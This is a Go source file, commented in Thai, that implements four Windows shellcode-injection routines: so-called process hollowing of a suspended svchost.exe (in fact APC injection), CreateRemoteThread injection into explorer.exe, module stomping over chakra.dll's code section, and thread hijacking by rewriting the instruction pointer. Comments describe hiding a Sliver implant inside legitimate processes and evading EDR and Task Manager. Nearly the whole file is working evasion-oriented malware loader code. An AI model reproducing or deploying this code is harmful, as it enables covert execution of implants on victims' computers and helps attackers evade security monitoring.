package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Process Hollowing — สร้าง process ปกติแล้วแทนที่ code ข้างใน
//
// ทำงานยังไง:
//   1. สร้าง svchost.exe ในสถานะ SUSPENDED (ยังไม่รัน)
//   2. Allocate memory ใน process นั้น
//   3. เขียน shellcode เข้าไป
//   4. เปลี่ยน entry point ให้ชี้ไปหา shellcode
//   5. Resume thread → shellcode ทำงาน
//
//   Task Manager เห็น: svchost.exe (ปกติ)
//   จริงๆ ข้างใน: Sliver implant
//
// MITRE ATT&CK: T1055.012 (Process Injection: Process Hollowing)

func processHollowing(targetProcess string, shellcode []byte) error {
	// 1. สร้าง target process ในสถานะ SUSPENDED
	targetPath, err := windows.UTF16PtrFromString(targetProcess)
	if err != nil {
		return fmt.Errorf("UTF16 conversion failed: %w", err)
	}

	var si STARTUPINFO
	var pi PROCESS_INFORMATION
	si.Cb = uint32(unsafe.Sizeof(si))

	ret, _, err := procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(targetPath)),
		0, 0,
		0,
		CREATE_SUSPENDED, // สร้างแต่ยังไม่รัน
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}
	defer func() {
		windows.CloseHandle(pi.Process)
		windows.CloseHandle(pi.Thread)
	}()

	fmt.Printf("    [*] Created suspended process PID: %d\n", pi.ProcessId)

	// 2. Allocate memory ใน target process
	remoteMem, _, err := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE, // เริ่มด้วย RW ก่อน (ไม่ใช่ RWX ทันที — ลด suspicion)
	)
	if remoteMem == 0 {
		// ถ้า allocate ไม่ได้ terminate process ที่สร้างไว้
		windows.TerminateProcess(pi.Process, 0)
		return fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	// 3. เขียน shellcode เข้าไปใน memory ของ target process
	var bytesWritten uintptr
	ret, _, err = procWriteProcessMem.Call(
		uintptr(pi.Process),
		remoteMem,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		windows.TerminateProcess(pi.Process, 0)
		return fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	// 4. เปลี่ยน protection เป็น RX (execute ได้ แต่เขียนไม่ได้ — ดูปกติกว่า RWX)
	var oldProtect uint32
	procVirtualProtectEx.Call(
		uintptr(pi.Process),
		remoteMem,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// 5. Queue APC to main thread เพื่อรัน shellcode ตอน resume
	procQueueAPC := kernel32.NewProc("QueueUserAPC")
	ret, _, err = procQueueAPC.Call(
		remoteMem,
		uintptr(pi.Thread),
		0,
	)
	if ret == 0 {
		windows.TerminateProcess(pi.Process, 0)
		return fmt.Errorf("QueueUserAPC failed: %w", err)
	}

	// 6. Resume thread → shellcode ทำงาน
	ret, _, _ = procResumeThread.Call(uintptr(pi.Thread))
	if ret == 0xFFFFFFFF {
		windows.TerminateProcess(pi.Process, 0)
		return fmt.Errorf("ResumeThread failed")
	}

	fmt.Printf("    [+] Shellcode injected into PID %d via APC\n", pi.ProcessId)
	return nil
}

// Classic Injection — Fallback ถ้า hollowing ไม่ได้
//
// ง่ายกว่า hollowing แต่จับง่ายกว่าเล็กน้อย:
//   1. เปิด process ที่มีอยู่แล้ว (เช่น explorer.exe)
//   2. Allocate memory + เขียน shellcode
//   3. CreateRemoteThread → รัน shellcode
//
// MITRE ATT&CK: T1055.001 (Process Injection: DLL Injection) / T1055.003 (Thread Execution Hijacking)

func classicInjection(shellcode []byte) error {
	// หา explorer.exe process
	pid, err := findProcessByName("explorer.exe")
	if err != nil {
		return fmt.Errorf("cannot find target process: %w", err)
	}

	fmt.Printf("    [*] Target: explorer.exe (PID: %d)\n", pid)

	// เปิด process handle
	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess failed: %w", err)
	}
	defer windows.CloseHandle(handle)

	// Allocate memory (เริ่มด้วย RW)
	remoteMem, _, err := procVirtualAllocEx.Call(
		uintptr(handle),
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if remoteMem == 0 {
		return fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	// เขียน shellcode
	var bytesWritten uintptr
	ret, _, err := procWriteProcessMem.Call(
		uintptr(handle),
		remoteMem,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	// เปลี่ยนเป็น RX
	var oldProtect uint32
	procVirtualProtectEx.Call(
		uintptr(handle),
		remoteMem,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	// CreateRemoteThread → รัน shellcode
	var threadId uint32
	ret, _, err = procCreateRemoteThread.Call(
		uintptr(handle),
		0,
		0,
		remoteMem,
		0,
		0,
		uintptr(unsafe.Pointer(&threadId)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateRemoteThread failed: %w", err)
	}

	fmt.Printf("    [+] Shellcode injected into PID %d (thread: %d)\n", pid, threadId)
	return nil
}

// Module Stomping — เขียนทับ DLL ที่โหลดอยู่แล้วใน memory
//
// ทำงานยังไง:
//   1. LoadLibrary DLL ที่ไม่ค่อยใช้ (เช่น amsi.dll, wldp.dll)
//   2. หา .text section
//   3. เขียน shellcode ทับ .text section
//   4. CreateThread ที่ address ของ .text
//
//   EDR เห็น: thread ทำงานใน DLL ที่ถูกต้อง (loaded, signed)
//   จริงๆ: code ข้างในถูกแทนที่ด้วย shellcode แล้ว
//
// MITRE ATT&CK: T1055.001

func moduleStomping(shellcode []byte) error {
	// โหลด DLL ที่ไม่ค่อยมีคนใช้
	sacrificialDll := "chakra.dll" // หรือ DLL อื่นที่มีอยู่แต่ไม่ค่อยใช้
	dll, err := windows.LoadDLL(sacrificialDll)
	if err != nil {
		return fmt.Errorf("cannot load sacrificial DLL: %w", err)
	}

	dllBase := uintptr(dll.Handle)

	// Parse PE header เพื่อหา .text section
	dosHeader := (*[64]byte)(unsafe.Pointer(dllBase))
	eLfanew := *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))
	peHeaderAddr := dllBase + uintptr(eLfanew)

	numberOfSections := *(*uint16)(unsafe.Pointer(peHeaderAddr + 6))
	sizeOfOptionalHeader := *(*uint16)(unsafe.Pointer(peHeaderAddr + 20))

	sectionStart := peHeaderAddr + 24 + uintptr(sizeOfOptionalHeader)

	for i := 0; i < int(numberOfSections); i++ {
		secAddr := sectionStart + uintptr(i*40)
		name := (*[8]byte)(unsafe.Pointer(secAddr))

		if string(name[:5]) == ".text" {
			virtualSize := *(*uint32)(unsafe.Pointer(secAddr + 8))
			virtualAddr := *(*uint32)(unsafe.Pointer(secAddr + 12))

			textAddr := dllBase + uintptr(virtualAddr)

			if int(virtualSize) < len(shellcode) {
				return fmt.Errorf(".text section too small (%d < %d)", virtualSize, len(shellcode))
			}

			// เปลี่ยน protection
			var oldProtect uint32
			windows.VirtualProtect(textAddr, uintptr(len(shellcode)), PAGE_EXECUTE_READWRITE, &oldProtect)

			// เขียน shellcode ทับ
			copy((*[1 << 20]byte)(unsafe.Pointer(textAddr))[:len(shellcode)], shellcode)

			// คืน protection
			windows.VirtualProtect(textAddr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, &oldProtect)

			// สร้าง thread ที่ .text section address
			var threadId uint32
			procCreateThread := kernel32.NewProc("CreateThread")
			ret, _, _ := procCreateThread.Call(0, 0, textAddr, 0, 0, uintptr(unsafe.Pointer(&threadId)))
			if ret == 0 {
				return fmt.Errorf("CreateThread failed")
			}

			fmt.Printf("    [+] Module stomping: shellcode in %s .text (thread: %d)\n", sacrificialDll, threadId)
			return nil
		}
	}

	return fmt.Errorf(".text section not found in %s", sacrificialDll)
}

// Thread Hijacking — ขโมย thread ของ process อื่นมารัน shellcode
//
// ทำงานยังไง:
//   1. หา thread ของ target process
//   2. Suspend thread
//   3. เขียน shellcode เข้า memory ของ process
//   4. เปลี่ยน RIP (instruction pointer) ให้ชี้ไปหา shellcode
//   5. Resume thread → shellcode ทำงาน
//
//   ไม่สร้าง thread ใหม่ = EDR ที่ monitor CreateRemoteThread จะไม่เห็น
//
// MITRE ATT&CK: T1055.003

func threadHijacking(shellcode []byte) error {
	// หา target process
	pid, err := findProcessByName("explorer.exe")
	if err != nil {
		return err
	}

	// เปิด process
	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(handle)

	// Allocate + write shellcode
	remoteMem, _, _ := procVirtualAllocEx.Call(
		uintptr(handle), 0, uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)
	if remoteMem == 0 {
		return fmt.Errorf("VirtualAllocEx failed")
	}

	procWriteProcessMem.Call(
		uintptr(handle), remoteMem,
		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0,
	)

	// หา thread ของ target process
	threadID, err := findThreadByPID(pid)
	if err != nil {
		return err
	}

	// เปิด thread handle
	procOpenThread := kernel32.NewProc("OpenThread")
	threadHandle, _, _ := procOpenThread.Call(
		0x001FFFFF, // THREAD_ALL_ACCESS
		0,
		uintptr(threadID),
	)
	if threadHandle == 0 {
		return fmt.Errorf("OpenThread failed")
	}
	defer windows.CloseHandle(windows.Handle(threadHandle))

	// Suspend thread
	procSuspendThread := kernel32.NewProc("SuspendThread")
	procSuspendThread.Call(threadHandle)

	// Get thread context
	procGetContext := kernel32.NewProc("GetThreadContext")
	// CONTEXT structure สำหรับ x64
	context := make([]byte, 1232) // CONTEXT_FULL
	*(*uint32)(unsafe.Pointer(&context[48])) = 0x10001F // CONTEXT_FULL
	procGetContext.Call(threadHandle, uintptr(unsafe.Pointer(&context[0])))

	// เปลี่ยน RIP ให้ชี้ไปหา shellcode
	// RIP offset ใน CONTEXT structure สำหรับ x64 = 248 (0xF8)
	*(*uintptr)(unsafe.Pointer(&context[248])) = remoteMem

	// Set thread context
	procSetContext := kernel32.NewProc("SetThreadContext")
	procSetContext.Call(threadHandle, uintptr(unsafe.Pointer(&context[0])))

	// Resume thread → shellcode ทำงาน
	procResumeThread.Call(threadHandle)

	fmt.Printf("    [+] Thread %d hijacked in PID %d\n", threadID, pid)
	return nil
}

// --- Helper Functions ---

func findProcessByName(name string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	for err == nil {
		exeName := windows.UTF16ToString(entry.ExeFile[:])
		if exeName == name {
			return entry.ProcessID, nil
		}
		err = windows.Process32Next(snapshot, &entry)
	}

	return 0, fmt.Errorf("process %s not found", name)
}

func findThreadByPID(pid uint32) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ThreadEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	procThread32First := kernel32.NewProc("Thread32First")
	procThread32Next := kernel32.NewProc("Thread32Next")

	ret, _, _ := procThread32First.Call(uintptr(snapshot), uintptr(unsafe.Pointer(&entry)))
	for ret != 0 {
		if entry.OwnerProcessID == pid {
			return entry.ThreadID, nil
		}
		ret, _, _ = procThread32Next.Call(uintptr(snapshot), uintptr(unsafe.Pointer(&entry)))
	}

	return 0, fmt.Errorf("no thread found for PID %d", pid)
}
